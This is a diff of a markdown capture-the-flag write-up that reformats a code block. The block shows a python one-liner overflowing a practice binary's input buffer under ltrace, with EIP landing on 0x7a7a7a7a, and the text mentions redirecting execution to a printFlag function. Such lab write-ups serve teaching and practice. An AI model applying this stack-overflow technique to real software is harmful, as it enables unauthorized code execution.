@@ -25,19 +25,18 @@ And there hava a function call printFlag.If I can controller eip and jump to thi
 0x1 Vulnerability
 =
 
-`# python -c "print 'a'*24+'zzzz'"|ltrace -i ./bby 
+	# python -c "print 'a'*24+'zzzz'"|ltrace -i ./bby 
 
-[0x8048491] __libc_start_main(0x80485c9, 1, 0xffb97214, 0x8048610 <unfinished ...>
+	[0x8048491] __libc_start_main(0x80485c9, 1, 0xffb97214, 0x8048610 <unfinished ...>
 
-[0x80485de] puts("This program is hungry. You shou"...This program is hungry. You should feed it.
+	[0x80485de] puts("This program is hungry. You shou"...This program is hungry. You should feed it.
 ) = 44
 
-[0x80485f2] __isoc99_scanf(0x80486d8, 0xffb97164, 0xffb9721c, 0xf75573fd) = 1
+	[0x80485f2] __isoc99_scanf(0x80486d8, 0xffb97164, 0xffb9721c, 0xf75573fd) = 1
 
-[0x80485fe] puts("Do you feel the flow?"Do you feel the flow?
+	[0x80485fe] puts("Do you feel the flow?"Do you feel the flow?
 )        = 22
 
-[0x7a7a7a7a] --- SIGSEGV (Segmentation fault) ---
+	[0x7a7a7a7a] --- SIGSEGV (Segmentation fault) ---
 
-[0xffffffffffffffff] +++ killed by SIGSEGV +++
-`
+	[0xffffffffffffffff] +++ killed by SIGSEGV +++
